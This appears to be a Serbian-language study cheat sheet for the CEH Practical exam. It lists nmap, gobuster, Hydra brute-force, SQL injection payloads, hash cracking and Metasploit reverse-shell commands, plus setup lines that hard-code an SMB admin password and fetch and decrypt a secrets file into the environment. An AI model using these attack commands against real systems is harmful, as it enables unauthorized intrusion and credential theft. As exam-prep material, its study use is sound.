#Config sgpt-a i SMB-a

##1

curl -fsSL https://raw.githubusercontent.com/stefanmilosavljevicns/cehpract/main/secret.txt.gpg -o /tmp/secret.txt.gpg && export $(gpg -d /tmp/secret.txt.gpg) && rm -f /tmp/secret.txt.gpg && mkdir -p ~/.config/shell_gpt && sed -i 's/^DEFAULT_MODEL=.*/DEFAULT_MODEL=gpt-4o-mini/' ~/.config/shell_gpt/.sgptrc 2>/dev/null || echo 'DEFAULT_MODEL=gpt-4o-mini' >> ~/.config/shell_gpt/.sgptrc

sgpt "Analiziraj ovaj nmap output i reci mi najbitnije nalaze" <<< "$(cat full_scan.txt)"


##2


echo '"\e\177": backward-kill-word' >> ~/.inputrc && bind -f ~/.inputrc && echo '"\ed": kill-word' >> ~/.inputrc && bind -f ~/.inputrc && apt install -y cifs-utils

echo -e 'username=Admin\npassword=Pa$$w0rd' | sudo tee /etc/smb-credentials >/dev/null && sudo chmod 600 /etc/smb-credentials

sudo apt update && sudo apt install -y cifs-utils && echo "//172.25.0.11/Users/Admin/Desktop/Share /home/attacker/Desktop/Share cifs credentials=/etc/smb-credentials,vers=3.0,uid=1000,gid=1000,iocharset=utf8,_netdev 0 0" | sudo tee -a /etc/fstab && sudo mount -a && sudo systemctl daemon-reload

//Ako bude problema
smbclient -L //172.25.0.11 -U Admin
________________________________________________________________
# 🛠 CEH Practical Cheat Sheet

# 🔍 NMAP

nmap -sS -sV -p- <IP> -oN results.txt

nmap -p- -A -O -sC -sV --script vuln -T4 <IP>

nmap -p 137,389,445 --script smb-os-discovery,ldap-rootdse,nbstat <IP>

# 🌐 DNS Cheat Sheet (CEH Practical)

## 🔍 dnsrecon
dnsrecon -d target.com -a  
dnsrecon -d target.com -D wordlist.txt -t brt  

## 🧪 dig
dig target.com  
dig target.com ANY  
dig target.com MX  
dig target.com NS  

## 🧰 nslookup
nslookup target.com  
nslookup -type=MX target.com  
nslookup -type=NS target.com  

## 💣 Zone Transfer
dig axfr @ns1.target.com target.com  

## 🎯 Šta tražiš
- subdomains → novi targeti  
- IP → za Nmap  
- MX → mail server  
- NS → za AXFR  

## ⚡ Mini logika
dnsrecon → subdomain  
dig → info  
AXFR → full dump  

# 🌐 GOBUSTER

gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt

gobuster dir -u http://target -w common.txt -x php,txt,html

gobuster dir -u http://target -w common.txt -x zip,sql,txt


# 🔐 HYDRA

hydra -l admin -P rockyou.txt ssh://<IP>

hydra -l admin -P rockyou.txt ftp://<IP>


# 📡 AIRCRACK

aircrack-ng capture.pcap

aircrack-ng -w rockyou.txt capture.pcap


# 🧬 CRYPTO

| Input Pattern / Primer            | Tip (Šta je)        | Kako prepoznati                         | Alat za rešavanje            | Komanda / Akcija                          |
|----------------------------------|---------------------|------------------------------------------|------------------------------|-------------------------------------------|
| YWRtaW46cGFzc3dvcmQ=              | Base64              | Završava se sa =                         | CyberChef                    | From Base64                               |
| 68 65 6c 6c 6f                   | Hex                 | Hex vrednosti (0-9, a-f)                 | CyberChef                    | From Hex                                  |
| %68%65%6C%6C%6F                  | URL Encoding        | %xx format                               | CyberChef                    | URL Decode                                |
| khoor                            | Caesar cipher       | Ima smisla posle pomeranja               | CyberChef                    | ROT / Caesar                              |
| uryyb                            | ROT13               | često “random readable”                  | CyberChef                    | ROT13                                     |
| 5f4dcc3b5aa765d61d8327deb882cf99 | MD5 hash            | 32 hex karaktera                         | John the Ripper              | john --wordlist=rockyou.txt hash.txt       |
| da39a3ee5e6b4b0d3255bfef95601890afd80709 | SHA1 hash | 40 hex karaktera                         | John / Hashcat               | john --format=raw-sha1 hash.txt           |
| $2y$10$eImiTXuWVxfM37uY4JANjQ==   | bcrypt              | Počinje sa $2y$ ili $2a$                 | Hashcat                      | hashcat -m 3200 hash.txt rockyou.txt      |
| U2FsdGVkX1+...                   | OpenSSL enc         | Počinje sa U2FsdGVkX1                    | CyberChef                    | OpenSSL Decrypt                           |
| Random string + key              | XOR                 | Nečitljivo, ali ima pattern             | CyberChef                    | XOR Brute Force                           |
| 0x48656c6c6f                     | Hex (0x)            | Počinje sa 0x                            | CyberChef                    | From Hex                                  |
| admin:password                  | Credentials (plain) | Već čitljivo                             | N/A                          | Nema potrebe za decode                 

# 💉 SQL INJECTION
' 
" 
`
' OR 1=1 --

admin' --
' AND 1=1 --
' AND 1=2 --
' UNION SELECT null,null --
' UNION SELECT database(),user() --
' UNION SELECT user,password FROM users --
' ORDER BY 1 --
' ORDER BY 2 --
' AND LENGTH(database())=4 --
' AND SUBSTRING(database(),1,1)='d' --

# 🦠 MALWARE (PE)

strings sample.exe

strings sample.exe | grep http

md5sum sample.exe

# 💣 METASPLOIT

msfconsole

search smb

use exploit/...

show payloads

set RHOSTS <IP>

set LHOST <IP>

run

linux/x86/meterpreter/reverse_tcp

windows/meterpreter/reverse_tcp

generic/shell_reverse_tcp

# 📂 FILE

file sample

strings sample

# 🧪 STEGO / Slika

steghide extract -sf file.jpg -p password
binwalk -e image.jpg

# 🔍 SEARCHSPLOIT

searchsploit apache

# 🎯 LOGIKA

web → gobuster

login → hydra / sqli

hash → john

exploit → metasploit

file → strings

wifi → aircrack

